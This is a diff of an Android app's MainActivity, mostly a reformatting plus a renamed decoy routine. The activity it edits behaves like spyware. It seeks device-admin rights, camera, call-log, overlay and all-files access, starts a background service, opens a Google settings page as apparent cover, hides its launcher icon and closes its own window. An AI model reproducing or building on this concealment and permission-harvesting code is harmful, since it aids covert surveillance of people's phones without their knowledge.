@@ -27,7 +27,7 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 55555;
     public static DevicePolicyManager devicePolicyManager;
     public static ComponentName componentName;
-    public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE= 2323;
+    public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323;
 
     @RequiresApi(api = Build.VERSION_CODES.R)
     @Override
@@ -36,10 +36,10 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         componentName = new ComponentName(this, AdminReceiver.class);
-        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
+        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
 
         if (!devicePolicyManager.isAdminActive(componentName)) {
-            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
             startActivity(intent);
@@ -56,37 +56,33 @@ public class MainActivity extends AppCompatActivity {
                         ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED &&
                         ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED &&
                         ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-        ){
+        ) {
             askPermission();
-        }
-        else{
+        } else {
 
-            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !Settings.canDrawOverlays(this)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !Settings.canDrawOverlays(this)) {
                 requestDisplayOverPermission();
-            }
-            else{
+            } else {
 
-                if (!Environment.isExternalStorageManager()){
+                if (!Environment.isExternalStorageManager()) {
 
                     Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                     Uri uri = Uri.fromParts("package", getPackageName(), null);
                     intent.setData(uri);
                     startActivity(intent);
-                }
-                else{
-                    Intent intent = new Intent( this, MainService.class );
+                } else {
+                    Intent intent = new Intent(this, MainService.class);
                     ContextCompat.startForegroundService(this, intent);
 
-                    openGooglePlayServiceSettingsPage(this);
+                    openExternalPage(this);
 
-                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q){
+                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                         hideIcon();
                     }
 
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                        new Handler().postDelayed(this::finishAndRemoveTask,1000);
-                    }
-                    else{
+                        new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+                    } else {
                         finish();
                     }
                 }
@@ -125,7 +121,8 @@ public class MainActivity extends AppCompatActivity {
             startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
         }
     }
-//_____________________________________________________________________________________________________________
+
+    //_____________________________________________________________________________________________________________
     @Override
     public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
@@ -138,34 +135,48 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
-//_____________________________________________________________________________________________________________
-    public static void openGooglePlayServiceSettingsPage(Context context) {
-        Intent intent = new Intent();
-        final String APP_PACKAGE_NAME = "com.google.android.gms";
-        final String APP_ACTIVITY_PATH = "com.google.android.gms.app.settings.GoogleSettingsLink";
-        intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(intent);
+
+    //_____________________________________________________________________________________________________________
+    public static void openExternalPage(Context context) {
+
+        try {
+            Intent intent = new Intent();
+            final String APP_PACKAGE_NAME = "com.google.android.gms";
+            final String APP_ACTIVITY_PATH = "com.google.android.gms.app.settings.GoogleSettingsLink";
+            intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+        }
+        catch (Exception e){
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setData(Uri.parse("https://play.google.com/store/apps/"));
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            e.printStackTrace();
+        }
+
     }
-//_____________________________________________________________________________________________________________
+
+    //_____________________________________________________________________________________________________________
     public void hideIcon() {
         getPackageManager().setComponentEnabledSetting(getComponentName(),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
     }
-//_____________________________________________________________________________________________________________
-@SuppressLint("SetTextI18n")
-@Override
-public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-    if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length >= 2
-            && grantResults[0] == PackageManager.PERMISSION_GRANTED
-            && grantResults[1] == PackageManager.PERMISSION_GRANTED
+    //_____________________________________________________________________________________________________________
+    @SuppressLint("SetTextI18n")
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-    ) {
+        if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length >= 2
+                && grantResults[0] == PackageManager.PERMISSION_GRANTED
+                && grantResults[1] == PackageManager.PERMISSION_GRANTED
 
-        Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
+        ) {
+
+            Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
+        }
     }
-}
 }
